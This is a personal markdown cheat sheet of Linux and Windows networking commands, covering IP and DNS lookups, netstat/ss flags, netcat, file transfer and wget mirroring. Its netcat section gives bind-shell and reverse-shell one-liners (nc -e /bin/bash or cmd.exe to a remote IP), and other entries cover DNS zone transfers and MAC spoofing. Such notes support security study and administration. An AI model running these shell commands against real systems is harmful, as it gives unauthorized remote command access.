---
title: 'Networking'
---

- [local info](#local-info)
- [whois & dns info](#whois-&-dns-info)
- [MAC-related](#mac-related)
- [ss/netstat](#ssnetstat)
	- [ss](#ss)
	- [netstat (depreciated)](#netstat-depreciated)
- [nc](#nc)
	- [chat](#chat)
	- [remote shell](#remote-shell)
	- [reverse shell](#reverse-shell)
- [transfer files](#transfer-files)
	- [nc](#nc)
	- [scp](#scp)
	- [ftp](#ftp)
	- [sftp](#sftp)
- [openvpn](#openvpn)
- [wget](#wget)

## local info

```bash
ip # *nix
ip addr show
ip a # show all
ip r list # routing table
ip link set dev <device> [up/down]
ifconfig # *nix, depreciated

ipconfig /all # windows

# my ip

dig +short myip.opendns.com @resolver1.opendns.com
dig TXT +short o-o.myaddr.l.google.com @ns1.google.com

# or

nslookup [myip.opendns.com](http://myip.opendns.com/) [resolver1.opendns.com](http://resolver1.opendns.com/)
```

## whois & dns info

```bash
whois <url>

nslookup <ip/url>

host <url> # all
host -t a <url> # ip
host -t ns <url> # name server
host -t mx <url> # mail server

dig <url> # ipv4 address
dig -t [ns/mx] <url> # name/mail server
dig axfr <url> @<name server> # lots inc subdomains
dig <url> ANY +nocomments +noauthority +noadditional +nostats

dsenum <url> # like dig and host but more

fierce -dns <url> # like dig and host

# see if domains exist
nslookup < urls.txt | grep "server can't find" | cut -d " " -f5
```

## MAC-related

```bash
$ arp -a

# *nix
$ sudo netdiscover
# netdiscover only does same subnet

$ macchanger
```

## ss/netstat

### ss

```bash
$ ss
-l # include listening sockets
-a # all
-[t/u] # only tcp/udp
-x # linux
-w # raw
-[4/6] # IPv4/6

-r # resolve protocol
-p # process

state [established/listening]
dst <ip>

-turp # tcp/udp protocol process 
```

### netstat (depreciated)

```bash
$ netstat # open tcp connections
-a # all listening ports and open connecitons
-n # ip not name
-o # owning process ID
-p # owning process name, *nix

-t # tcp
-u # udp
-p tcp/udp

# -ao takes a lot longer than -#ano?

-r # routing table
-s # stats

-tnlp # listening ports

-tulpn # most things

# add number for interval
netstat -ano 1 | find "<pid>"

```

## nc

### chat

```bash
# computer 1
nc -lnvp 4444 # port
# computer 2
nc <computer 1 name> 4444
```

### remote shell

```bash
# host
nc -lvp 1337 -e cmd.exe # from Windows
nc -lvp 1337 -e /bin/bash # from linux
# remote
nc <host_ip> <port>
```

### reverse shell

```bash
# host
nc <remote_ip> <port> -e cmd.exe # from Windows
nc <remote_ip> <port> -e /bin/bash # from linux
# remote
nc -lnvp <port>
```

## transfer files

### nc

```bash
# sender
nc <target_ip> <port> < send_file.txt
# receiver
nc -lnvp <port> > rec_file.txt
```

### scp

```bash
ssh remote_user@ip # connect to computer with file
scp <file> <user>@<ip>:<remote_dir> # local or remote or other
```

### ftp

```bash
ftp> put
ftp> get
```

### sftp

```bash
sftp remote_user@ip

(l)pwd # (local) pwd
(!)dir # (remote) dir
(l)cd # (local) cd
put <file> # transfer
```

## openvpn

```bash
sudo openvpn <file>.ovpn
```

## wget

```bash
wget -r -l 1 https://www.howtostudykorean.com/other-stuff/lesson-list/ --no-check-certificate -k -p
-c -nc
wget --mirror --convert-links (-k) --adjust-extension (-E) --page-requisites (-p) http://example.org
-D http://howtostudykorean.com/
wget --no-check-certificate -mpEk
wget http://traffic.libsyn.com/talktomeinkorean/ttmikdi-l{3..10}l{1..30}.mp3
wget -A pdf,jpg -m -p -E -k -K -np -nd http://site/path/
```